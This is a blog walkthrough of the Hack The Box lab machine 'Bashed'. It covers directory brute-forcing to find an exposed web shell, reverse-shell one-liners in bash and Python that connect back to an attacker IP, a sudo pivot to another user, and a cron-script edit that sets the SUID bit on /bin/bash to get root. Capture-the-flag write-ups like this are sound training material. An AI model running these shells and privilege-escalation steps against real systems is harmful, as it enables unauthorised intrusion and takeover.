---
layout: post
title: HTB Bashed  
subtitle: Easy Box
thumbnail-img: /assets/img/bashed/bashed.png
tags: [HTB]
---

# Notes
![Bashed](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bashed/bashed.png)


| Name | BountyHunter |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 09 Dec 2019 |
| DIFFICULTY | Easy |

# Bashed

# Port Scan

For every machine I pen test I start with a port scan to identify open ports. This machine only has one port open, port 80 serving an Apache Web Server.

`nmap -p- -sVC 10.10.10.68 -oN scriptScan.nmap`
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

# HTTP 80

Going to the website it looks like a blog highlighting something called "phpbash". 
![Bashed](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bashed/bashed1.png)

Clicking on the blog post brought me to http://10.10.10.68/single.html. It explained that `phpbash` is a web shell and was developed on this server! The author gave a screenshot showing off the web shell

![Bashed](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bashed/bashed2.png)

I tried going to http://10.10.10.68/uploads/phpbash.php for a quick win but I got a Not Found

![Bashed](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bashed/bashed3.png)

My next step was to use `feroxbuster` to try and brute force the correct directory. 

```
┌──(root㉿kali)-[~/htb/bashed]
└─# feroxbuster -u http://10.10.10.68/ -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html,txt,php 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.68/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [html, txt, php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[snip]
200      GET      154l      547w     8193c http://10.10.10.68/about.html
403      GET       11l       32w      295c http://10.10.10.68/.htm.html
403      GET       11l       32w      294c http://10.10.10.68/.htm.txt
301      GET        9l       28w      308c http://10.10.10.68/php => http://10.10.10.68/php/
301      GET        9l       28w      308c http://10.10.10.68/dev => http://10.10.10.68/dev/
[snip]
```

Inside `/dev` there were two files.

`http://10.10.10.68/dev/`
`http://10.10.10.68/dev/phpbash.min.php`
![Bashed](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bashed/bashed4.png)

Both of them appear to be the web shell referenced in the post above

![Bashed](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bashed/bashed5.png)

Now that we can run commands on the system I will get a reverse shell to make working with the system a little bit easier. I initially tried a simple bash tcp reverse shell `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1` but that did not work. I next tried using a python one-liner that I had success with.
```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
```

After running that command I got a shell back on my listener. (make sure to start a `nc` listener before running the command) 
```
┌──(root㉿kali)-[/opt/linPriv]
└─# nc -lvnp 4444                                  
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.68] 54272
$ whoami
whoami
www-data
```

I'll next use python to upgrade this dumb shell to a tty
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/var/www/html/dev$ 
```

# Pivot To scriptmanager

Inside the `/etc/passwd` file there are three potential users that I can pivot to. Root would be nice but I suspect that I will have to switch to a standard user.
```
www-data@bashed:/var/www/html/dev$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[snip]
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
```

Doing a little bit of enumeration as `www-data` shows that I can run any command as `scriptmanager`

```
www-data@bashed:/var/www/html/dev$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

I can use `sudo -u scriptmanager` to run the same python reverse shell done in the web-shell to get a shell as `scriptmanager`
```
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Same as before I'll upgrade to a better tty shell

```
┌──(root㉿kali)-[~]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.68] 54274
$ whoami
whoami
scriptmanager
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
scriptmanager@bashed:/var/www/html/dev$ 
```

# Root 

I noticed `/scripts` in the root directory of the file structure, this is not a normal folder

```
scriptmanager@bashed:/var/www/html/dev$ ls /
ls /
bin   etc         lib         media  proc  sbin     sys  var
boot  home        lib64       mnt    root  scripts  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv      usr
```

The script looks like it just will open up a file and put some text in it.
```
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
```

I had a hunch that root might be running this script every so often. I downloaded [pspy](https://github.com/DominicBreuker/pspy) a process sniffer to see what root is doing. 

I hosted the file on my kali machine with a python3 webserver
```
┌──(root㉿kali)-[/opt/linPriv]
└─# python3 -m http.server 80      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.68 - - [30/Sep/2022 17:34:25] "GET /pspy64 HTTP/1.1" 200 -
```

Then downloaded it into `/tmp` on the host using `wget`

```
scriptmanager@bashed:/tmp$ wget 10.10.14.8/pspy64
wget 10.10.14.8/pspy64
--2022-10-02 20:45:12--  http://10.10.14.8/pspy64
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: 'pspy64'

pspy64              100%[===================>]   2.94M  1.76MB/s    in 1.7s    

2022-10-02 20:45:14 (1.76 MB/s) - 'pspy64' saved [3078592/3078592]
scriptmanager@bashed:/tmp$ chmod +x pspy64
```

Running it shows that root runs the test.py every so often
```
scriptmanager@bashed:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
[snip]

2022/10/02 20:47:50 CMD: UID=0    PID=1      | /sbin/init noprompt 
2022/10/02 20:48:01 CMD: UID=0    PID=2170   | /usr/sbin/CRON -f 
2022/10/02 20:48:01 CMD: UID=0    PID=2171   | /usr/sbin/CRON -f 
2022/10/02 20:48:01 CMD: UID=0    PID=2172   | python test.py 
2022/10/02 20:49:01 CMD: UID=0    PID=2173   | /usr/sbin/CRON -f 
2022/10/02 20:49:01 CMD: UID=0    PID=2175   | python test.py 
2022/10/02 20:49:01 CMD: UID=0    PID=2174   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
```

The `scriptmanager` user has rights to edit this file!

```
scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2 07:19 .
drwxr-xr-x 23 root          root          4096 Jun  2 07:25 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Oct  2 20:50 test.txt
```

Because root executes this file we can use `os.system` to run commands as root. I used `sed` to import the library at the beginning of the file and then used `>>` to add the SUID bit onto `/bin/bash`. That will allow us to run the file as the owner, who is root. Giving us a root shell. For more on SUID you can read up on it [here](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)

```
sed -i '1s/^/import os\n/' test.py
echo "os.system('chmod u+s /bin/bash')" >> test.py

scriptmanager@bashed:/scripts$ cat test.py
cat test.py
import os
f = open("test.txt", "w")
f.write("testing 123!")
f.close
os.system('chmod u+s /bin/bash')
```

After waiting a minute or two the `s` bit is set
```
scriptmanager@bashed:/scripts$ ls -ls /bin/bash
ls -ls /bin/bash
1016 -rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

Now that everything is set getting root is as simple as running `bash -p`

```
scriptmanager@bashed:/scripts$ bash -p
bash -p
bash-4.3# whoami
whoami
root
```
